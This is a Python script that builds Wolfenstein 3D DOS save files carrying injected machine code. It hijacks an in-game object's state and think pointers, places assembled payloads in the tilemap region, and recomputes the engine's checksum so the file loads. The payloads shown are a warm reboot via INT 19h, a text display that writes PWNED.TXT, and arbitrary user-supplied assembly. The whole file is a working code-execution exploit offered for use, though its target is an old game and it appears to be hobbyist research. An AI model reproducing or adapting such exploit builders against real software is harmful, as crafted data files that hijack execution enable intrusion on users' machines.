#!/usr/bin/env python3
"""Build Wolf3D SAVEGAM files with injected payloads.

Examples:
  python3 make-save.py --slot 0 --payload reboot
  python3 make-save.py --slot 1 --payload text --text "Wolf2Shell by Hypn"
  python3 make-save.py --slot 2 --payload asm --asm wolf2shell.asm
"""
from __future__ import annotations

import argparse
import os
import struct
import subprocess
import sys
import tempfile
from pathlib import Path

HERE = Path(__file__).resolve().parent
# Default output directory, relative to the current working directory.
DEFAULT_OUTDIR = Path("output")

# Save layout (non-SPEAR, 19273-byte saves)
SZ_HDR = 32
SZ_GS = 66
SZ_LR = 80
SZ_TM = 4096
SZ_AT = 8192
SZ_AC = 1369
SZ_AP = 74
SZ_OBJ = 60
SZ_END = 2 + 3200 + 128 + 640 + 10 + 4
PLAYER_OFF = SZ_HDR + SZ_GS + SZ_LR + SZ_TM + SZ_AT + SZ_AC + SZ_AP

# Full-game BSS/DGROUP-relative offsets (confirmed for retail Wolf3d.exe).
DEFAULT_OBJLIST_OFF = 0xB51C
DEFAULT_TILEMAP_OFF = 0x75BA

VERSION_DEFAULTS = {
    "retail": {
        "ext": ".WL6",
        "dgroup_rel": 0x398D,
        "objlist_off": DEFAULT_OBJLIST_OFF,
        "tilemap_off": DEFAULT_TILEMAP_OFF,
    },
    "shareware": {
        "ext": ".WL1",
        # Shareware (WL1) build of WOLF3D.EXE.  DGROUP_REL derived by emulating the
        # LZEXE 0.91 unpack stub and reading the C0.ASM `mov dx, DGROUP` immediate
        # (load 0x1000 -> 0x4783); see HURDLES.md / SHAREWARE.md.
        "dgroup_rel": 0x3783,
        # Shareware BSS/DGROUP-relative offsets (retail equivalents 0xB51C / 0x75BA).
        # objlist is confirmed from the save's own actorat near pointers; tilemap by
        # matching code immediates against the retail build.
        "objlist_off": 0xAB6E,
        "tilemap_off": 0x6BD8,
    },
}


def parse_hex16(label: str):
    def _parse(value: str) -> int:
        value = str(value).strip()
        if value.lower().startswith("0x"):
            value = value[2:]
        if not value or any(c not in "0123456789abcdefABCDEF" for c in value):
            raise argparse.ArgumentTypeError(f"{label} must be hex (e.g. 0192)")
        n = int(value, 16)
        if not (0 <= n <= 0xFFFF):
            raise argparse.ArgumentTypeError(f"{label} must fit in 16 bits")
        return n

    return _parse


def checksum(save: bytearray) -> int:
    """Wolf3D DoChecksum XOR-pair checksum over the same regions as the engine."""
    off = SZ_HDR
    cs = 0
    for sz in [SZ_GS, SZ_LR, SZ_TM, SZ_AT]:
        buf = save[off : off + sz]
        off += sz
        for i in range(sz - 1):
            cs = (cs + (buf[i] ^ buf[i + 1])) & 0xFFFFFFFF
    off += SZ_AC + SZ_AP
    off = len(save) - SZ_END
    for sz in [2, 3200, 128, 640, 10]:
        buf = save[off : off + sz]
        off += sz
        for i in range(sz - 1):
            cs = (cs + (buf[i] ^ buf[i + 1])) & 0xFFFFFFFF
    struct.pack_into("<I", save, len(save) - 4, cs)
    return cs


def resolve_dgroup(args: argparse.Namespace) -> int:
    defaults = VERSION_DEFAULTS[args.version]
    if args.dgroup is not None:
        return args.dgroup & 0xFFFF
    psp = args.psp if args.psp is not None else 0x0192
    dgroup_rel = args.dgroup_rel if args.dgroup_rel is not None else defaults["dgroup_rel"]
    load_segment = (psp + 0x10) & 0xFFFF
    dgroup = (load_segment + dgroup_rel) & 0xFFFF
    print(
        f"PSP=0x{psp:04X} load=0x{load_segment:04X} DGROUP_REL=0x{dgroup_rel:04X} "
        f"DGROUP=0x{dgroup:04X}"
    )
    return dgroup


# Embedded clean base saves (gzip + base64) so the script works standalone.
EMBEDDED_SAVES = {
    "retail": "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",
    "shareware": "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",
}


def load_save(version: str) -> bytearray:
    blob = EMBEDDED_SAVES.get(version)
    if not blob:
        raise SystemExit(f"no embedded base save for version {version}")
    import base64, gzip
    data = bytearray(gzip.decompress(base64.b64decode(blob)))
    if len(data) != 19273:
        print(
            f"warning: unexpected save size {len(data)} (expected 19273 for non-SPEAR)",
            file=sys.stderr,
        )
    return data


def hook_obj11(save: bytearray, dgroup: int, think_off: int, objlist_off: int) -> int:
    """Hook obj#11 state->fake statetype, think->think_off. Returns obj#11 file offset."""
    t = PLAYER_OFF + 11 * SZ_OBJ
    obj_end = len(save) - SZ_END
    if t + SZ_OBJ > obj_end:
        raise SystemExit("save has no object #11")
    # active=1, ticcount=0 so DoActor ticks it on the next frame.
    save[t + 0] = 1
    save[t + 1] = 0
    save[t + 2] = 0
    save[t + 3] = 0
    # state -> fake statetype inside obj#11 at obj+34
    fake_off = (objlist_off + 11 * SZ_OBJ + 34) & 0xFFFF
    save[t + 6] = fake_off & 0xFF
    save[t + 7] = (fake_off >> 8) & 0xFF
    save[t + 8] = dgroup & 0xFF
    save[t + 9] = (dgroup >> 8) & 0xFF
    # fake statetype
    save[t + 34] = 0
    save[t + 35] = 0  # rotate
    save[t + 36] = 0
    save[t + 37] = 0  # shapenum
    save[t + 38] = 0
    save[t + 39] = 0  # tictime
    save[t + 40] = think_off & 0xFF
    save[t + 41] = (think_off >> 8) & 0xFF
    save[t + 42] = dgroup & 0xFF
    save[t + 43] = (dgroup >> 8) & 0xFF
    for i in range(44, 48):
        save[t + i] = 0  # action = 0
    print(f"hook: obj#11.state={dgroup:04X}:{fake_off:04X} think={dgroup:04X}:{think_off:04X}")
    return t


def payload_reboot(save: bytearray, dgroup: int, args: argparse.Namespace) -> None:
    t = hook_obj11(save, dgroup, think_off=(args.objlist_off + 11 * SZ_OBJ + 48) & 0xFFFF, objlist_off=args.objlist_off)
    shellcode = bytes([0xCD, 0x19])  # INT 19h - warm reboot
    for i, b in enumerate(shellcode):
        save[t + 48 + i] = b
    print("payload: INT 19h warm reboot (2 bytes) at obj#11+48")


def assemble_bytes(asm_source: str, nasm: str, label: str) -> bytes:
    with tempfile.TemporaryDirectory() as td:
        asm_path = Path(td) / f"{label}.asm"
        bin_path = Path(td) / f"{label}.bin"
        asm_path.write_text(asm_source, encoding="utf-8")
        cmd = [nasm, "-f", "bin", "-o", str(bin_path), str(asm_path)]
        r = subprocess.run(cmd, capture_output=True, text=True)
        if r.returncode != 0:
            sys.stderr.write(r.stdout)
            sys.stderr.write(r.stderr)
            raise SystemExit(f"nasm failed: {' '.join(cmd)}")
        return bin_path.read_bytes()


def assemble_file(asm_path: Path, nasm: str, org: int) -> bytes:
    src = asm_path.read_text(encoding="utf-8")
    if "__PAYLOAD_ORG__" in src:
        src = src.replace("__PAYLOAD_ORG__", f"0x{org:04X}")
    else:
        # If the file has an explicit org, replace common forms so the payload lands
        # at the requested DGROUP-relative offset when injected into tilemap.
        replaced = False
        for needle in ("org 0x100", "org 0x0100", "ORG 0x100", "ORG 0x0100"):
            if needle in src:
                src = src.replace(needle, f"org 0x{org:04X}", 1)
                replaced = True
                break
        if not replaced:
            # Prepend an org directive only if none exists at top-level.
            lines = src.splitlines()
            has_org = any(l.strip().lower().startswith("org ") for l in lines[:20])
            if not has_org:
                src = f"bits 16\norg 0x{org:04X}\n" + src
    return assemble_bytes(src, nasm, asm_path.stem)


def inject_tilemap(save: bytearray, payload: bytes, tilemap_off: int) -> int:
    tilemap_file_off = SZ_HDR + SZ_GS + SZ_LR
    if len(payload) > SZ_TM:
        raise SystemExit(
            f"payload {len(payload)} bytes does not fit in tilemap ({SZ_TM} bytes)"
        )
    save[tilemap_file_off : tilemap_file_off + len(payload)] = payload
    for i in range(tilemap_file_off + len(payload), tilemap_file_off + SZ_TM):
        save[i] = 0
    print(
        f"payload: {len(payload)} bytes injected at DGROUP:0x{tilemap_off:04X} "
        f"(tilemap slack {SZ_TM - len(payload)} bytes)"
    )
    return tilemap_off


def payload_text(save: bytearray, dgroup: int, args: argparse.Namespace) -> None:
    text = args.text if args.text is not None else "Wolf2Shell by Hypn"
    # Escape for NASM db string: keep printable ASCII/simple escapes; fall back to bytes.
    safe = text.encode("latin-1", errors="replace")
    hex_bytes = ",".join(f"0x{b:02X}" for b in safe)
    msg_len = len(safe)
    asm = f"""bits 16
org 0x{args.tilemap_off:04X}
start:
    push cs
    pop ds
    mov ax, 0x0003
    int 0x10
    mov si, msg
.print:
    lodsb
    test al, al
    jz .done
    mov ah, 0x0E
    mov bh, 0x00
    mov bl, 0x07
    int 0x10
    jmp .print
.done:
    ; write the message to PWNED.TXT next to the game
    mov dx, fname
    xor cx, cx
    mov ah, 0x3C
    int 0x21
    jc .wait
    mov bx, ax
    mov dx, msg
    mov cx, {msg_len}
    mov ah, 0x40
    int 0x21
    mov ah, 0x3E
    int 0x21
    mov si, nl
.nl:
    lodsb
    test al, al
    jz .wait
    mov ah, 0x0E
    mov bh, 0x00
    mov bl, 0x07
    int 0x10
    jmp .nl
.wait:
    xor ah, ah
    int 0x16
    mov ax, 0x4C00
    int 0x21
msg: db {hex_bytes}, 0
fname: db "PWNED.TXT", 0
nl: db 0x0D, 0x0A, "(press any key to exit)", 0x0D, 0x0A, 0
"""
    payload = assemble_bytes(asm, args.nasm, "text_payload")
    think_off = inject_tilemap(save, payload, args.tilemap_off)
    hook_obj11(save, dgroup, think_off=think_off, objlist_off=args.objlist_off)
    print(f"payload: text {text!r}")


def payload_asm(save: bytearray, dgroup: int, args: argparse.Namespace) -> None:
    asm_arg = args.asm if args.asm is not None else "wolf2shell.asm"
    asm_path = Path(asm_arg)
    if not asm_path.is_absolute():
        asm_path = (HERE / asm_path).resolve()
    if not asm_path.exists():
        raise SystemExit(f"ASM file not found: {asm_path}")
    payload = assemble_file(asm_path, args.nasm, args.tilemap_off)
    think_off = inject_tilemap(save, payload, args.tilemap_off)
    hook_obj11(save, dgroup, think_off=think_off, objlist_off=args.objlist_off)
    print(f"payload: asm {asm_path}")


PAYLOADS = {
    "reboot": payload_reboot,
    "text": payload_text,
    "asm": payload_asm,
}

# Default in-game save label per payload (the name shown in the Load Game menu).
# Override with --name.
PAYLOAD_NAMES = {
    "reboot": "Reboot!",
    "text": "Text + Shell",
    "asm": "ASM payload!",
}


def build(args: argparse.Namespace) -> Path:
    defaults = VERSION_DEFAULTS[args.version]
    if not (0 <= args.slot <= 9):
        raise SystemExit("slot must be 0-9 (WL_MENU.C uses a single digit)")

    outdir = Path(args.outdir) if args.outdir is not None else DEFAULT_OUTDIR
    if not outdir.is_absolute():
        outdir = (Path.cwd() / outdir).resolve()
    outdir.mkdir(parents=True, exist_ok=True)

    ext = defaults["ext"]
    save = load_save(args.version)
    dgroup = resolve_dgroup(args)

    args.objlist_off = args.objlist_off if args.objlist_off is not None else defaults["objlist_off"]
    args.tilemap_off = args.tilemap_off if args.tilemap_off is not None else defaults["tilemap_off"]

    # Savegame header: 32-byte name field (null-padded). Checksum does not cover header.
    name = args.name if args.name is not None else PAYLOAD_NAMES[args.payload]
    name_bytes = name.encode("ascii", errors="replace")[:31]
    save[:SZ_HDR] = name_bytes.ljust(SZ_HDR, b"\x00")

    payload_fn = PAYLOADS[args.payload]
    payload_fn(save, dgroup, args)

    cs = checksum(save)
    out_path = outdir / f"SAVEGAM{args.slot}{ext}"
    out_path.write_bytes(save)

    print(f"name: {name}")
    print(f"version: {args.version} ({ext})")
    print(f"source: embedded:{args.version}")
    print(f"wrote: {out_path}")
    print(f"checksum=0x{cs:08X}")
    print(
        f"Load slot {args.slot} in-game. For quickload/F9, that slot must have been "
        "quicksaved/quickloaded once in the current session as usual."
    )
    return out_path


def main() -> None:
    ap = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        add_help=False,
    )

    required = ap.add_argument_group("(required)")
    required.add_argument(
        "--payload",
        required=True,
        choices=sorted(PAYLOADS),
        help="payload type",
    )
    required.add_argument(
        "--text",
        default="Wolf2Shell by Hypn",
        help='text to display when `--payload text` (default: "Wolf2Shell by Hypn")',
    )
    required.add_argument(
        "--asm",
        default="wolf2shell.asm",
        help="ASM file to assemble when `--payload asm` (default: wolf2shell.asm)",
    )

    defaults = ap.add_argument_group("(defaults)")
    defaults.add_argument("--name", default=None, help="in-game save label (default: Reboot! / Text + Shell / ASM payload!)")
    defaults.add_argument(
        "--version",
        choices=["retail", "shareware"],
        default="retail",
        help="game version (default: retail)",
    )
    defaults.add_argument("--slot", type=int, default=0, help=argparse.SUPPRESS)
    defaults.add_argument(
        "--psp",
        type=parse_hex16("PSP"),
        default=0x0192,
        help="Wolf3d.exe PSP segment in hex (default: 0192)",
    )
    defaults.add_argument(
        "--outdir",
        default=str(DEFAULT_OUTDIR),
        help="output directory (default: ./output)",
    )

    advanced = ap.add_argument_group("(advanced)")
    advanced.add_argument("-h", "--help", action="help", help="show this help message and exit")
    advanced.add_argument("--dgroup", type=parse_hex16("DGROUP"), help="override runtime DGROUP segment directly")
    advanced.add_argument(
        "--dgroup-rel",
        type=parse_hex16("DGROUP_REL"),
        dest="dgroup_rel",
        help="override DGROUP delta (DGROUP = PSP+0x10+DGROUP_REL)",
    )
    advanced.add_argument(
        "--objlist-off",
        type=parse_hex16("objlist_off"),
        dest="objlist_off",
        help=f"DGROUP-relative objlist offset (default {DEFAULT_OBJLIST_OFF:#x})",
    )
    advanced.add_argument(
        "--tilemap-off",
        type=parse_hex16("tilemap_off"),
        dest="tilemap_off",
        help=f"DGROUP-relative tilemap offset (default {DEFAULT_TILEMAP_OFF:#x})",
    )
    advanced.add_argument("--nasm", default="nasm", help="nasm executable (default: nasm)")

    args = ap.parse_args()
    build(args)


if __name__ == "__main__":
    main()
